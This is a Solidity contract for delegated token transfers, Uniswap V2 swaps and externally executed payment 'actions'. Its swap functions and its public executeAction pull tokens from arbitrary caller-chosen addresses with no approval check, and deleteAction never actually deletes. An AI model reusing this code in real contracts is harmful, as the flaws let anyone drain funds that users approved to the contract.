// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "forge-std/console.sol";

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IExternalContract {
    function addAction(
        uint256 actionId,
        uint256[] calldata args
    ) external returns (bool);

    function setActiveState(
        uint256 actionId,
        bool newIsActive
    ) external returns (bool);

    function executeAction(uint256 actionId) external returns (bool);

    function deleteAction(uint256 actionId) external returns (bool);
}

contract TokenDelegator {
    IUniswapV2Router public uniswapV2Router;

    constructor() {
        uniswapV2Router = IUniswapV2Router(
            0x87aE49902B749588c15c5FE2A6fE6a1067a5bea0
        );
    }

    mapping(address => mapping(address => bool)) public approvals;

    struct Transfer {
        IERC20 token;
        address from;
        address to;
        uint256 amount;
    }

    struct TokenAmount {
        address from;
        IERC20 token;
        uint amountIn;
    }

    struct Payment {
        address contractAddress;
        bool initialized;
        TokenAmount[] tokensAmounts;
        address ownerAddress;
    }

    mapping(uint => Payment) public payments;
    uint[] public actionIds;

    function approve(address _user) public {
        approvals[_user][msg.sender] = true;
    }

    function allowance(
        address _owner,
        address _spender
    ) public view returns (bool) {
        return approvals[_owner][_spender];
    }

    function transferToken(
        IERC20 token,
        address _from,
        address _to,
        uint256 _amount
    ) public {
        require(approvals[msg.sender][_from], "TokenDelegator: not approved");
        token.transferFrom(_from, address(this), _amount);
        token.transfer(_to, _amount);
    }

    function transferBatch(Transfer[] memory transfers) public {
        for (uint256 i = 0; i < transfers.length; i++) {
            Transfer memory t = transfers[i];
            require(
                approvals[msg.sender][t.from],
                "TokenDelegator: not approved for all tokens"
            );
            t.token.transferFrom(t.from, address(this), t.amount);
            t.token.transfer(t.to, t.amount);
        }
    }

    function swapTokensForTokens(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint amountIn,
        uint amountOutMin,
        address _from,
        address to,
        uint deadline
    ) public returns (uint[] memory) {
        tokenIn.transferFrom(_from, address(this), amountIn);

        tokenIn.approve(address(uniswapV2Router), amountIn);

        address[] memory path = new address[](2);
        path[0] = address(tokenIn);
        path[1] = address(tokenOut);
        return
            uniswapV2Router.swapExactTokensForTokens(
                amountIn,
                amountOutMin,
                path,
                to,
                deadline
            );
    }

    function swapTokensForETH(
        IERC20 tokenIn,
        uint amountIn,
        uint amountOutMin,
        address _from,
        address to,
        uint deadline
    ) public returns (uint[] memory) {
        tokenIn.transferFrom(_from, address(this), amountIn);

        tokenIn.approve(address(uniswapV2Router), amountIn);

        address[] memory path = new address[](2);
        path[0] = address(tokenIn);
        path[1] = uniswapV2Router.WETH();
        return
            uniswapV2Router.swapExactTokensForETH(
                amountIn,
                amountOutMin,
                path,
                to,
                deadline
            );
    }

    function swapETHForTokens(
        IERC20 tokenOut,
        uint amountOutMin,
        address to,
        uint deadline
    ) public payable returns (uint[] memory) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(tokenOut);
        return
            uniswapV2Router.swapExactETHForTokens{value: msg.value}(
                amountOutMin,
                path,
                to,
                deadline
            );
    }

    function addActionExternal(
        uint actionId,
        address _contractAddress,
        TokenAmount[] calldata tokensAmounts,
        uint256[] calldata args
    ) public returns (bool) {
        require(!payments[actionId].initialized, "Action ID already exists");

        IExternalContract externalContract = IExternalContract(
            _contractAddress
        );

        bool success = externalContract.addAction(actionId, args);

        require(success, "External contract call failed");

        payments[actionId].contractAddress = _contractAddress;
        payments[actionId].initialized = true;
        payments[actionId].ownerAddress = address(uint160(args[0]));

        for (uint i = 0; i < tokensAmounts.length; i++) {
            payments[actionId].tokensAmounts.push(tokensAmounts[i]);
        }

        return true;
    }

    function setActiveState(
        uint actionId,
        bool newIsActive
    ) public returns (bool) {
        require(payments[actionId].initialized, "Action does not exist");
        require(
            msg.sender == payments[actionId].ownerAddress,
            "You do not have rights to this automation."
        );
        Payment memory action = payments[actionId];

        IExternalContract externalContract = IExternalContract(
            action.contractAddress
        );

        bool success = externalContract.setActiveState(actionId, newIsActive);

        require(success, "External contract call reverted");

        return true;
    }

    function deleteAction(uint actionId) public returns (bool) {
        require(payments[actionId].initialized, "Action does not exist");
        require(
            msg.sender == payments[actionId].ownerAddress,
            "You do not have rights to this automation."
        );
        Payment memory action = payments[actionId];

        IExternalContract externalContract = IExternalContract(
            action.contractAddress
        );

        bool success = externalContract.deleteAction(actionId);
        require(success, "External contract call reverted");

        action.initialized = false;
        return true;
    }

    function getPaymentById(
        uint actionId
    )
        public
        view
        returns (
            address contractAddress,
            bool initialized,
            TokenAmount[] memory tokensAmounts
        )
    {
        require(
            payments[actionId].initialized,
            "Invalid ID: This payment action does not exist."
        );

        Payment storage payment = payments[actionId];

        TokenAmount[] memory tokensAmountsCopy = new TokenAmount[](
            payment.tokensAmounts.length
        );

        for (uint i = 0; i < payment.tokensAmounts.length; i++) {
            tokensAmountsCopy[i] = payment.tokensAmounts[i];
        }

        return (
            payment.contractAddress,
            payment.initialized,
            tokensAmountsCopy
        );
    }

    function executeAction(uint actionId) public returns (bool) {
        require(
            payments[actionId].initialized,
            "Invalid ID: This automation action does not exist."
        );

        Payment storage action = payments[actionId];
        address externalContractAddress = action.contractAddress;

        for (uint i = 0; i < action.tokensAmounts.length; i++) {
            TokenAmount memory tokenAmount = action.tokensAmounts[i];
            require(
                tokenAmount.token.allowance(tokenAmount.from, address(this)) >=
                    tokenAmount.amountIn,
                string(abi.encodePacked("Not enough allowance for token ", i))
            );

            bool transferSuccess = tokenAmount.token.transferFrom(
                tokenAmount.from,
                externalContractAddress,
                tokenAmount.amountIn
            );

            if (!transferSuccess) {
                return false;
            }
        }

        IExternalContract externalContract = IExternalContract(
            externalContractAddress
        );

        bool success = externalContract.executeAction(actionId);

        require(success, "External contract call failed");

        return true;
    }
}
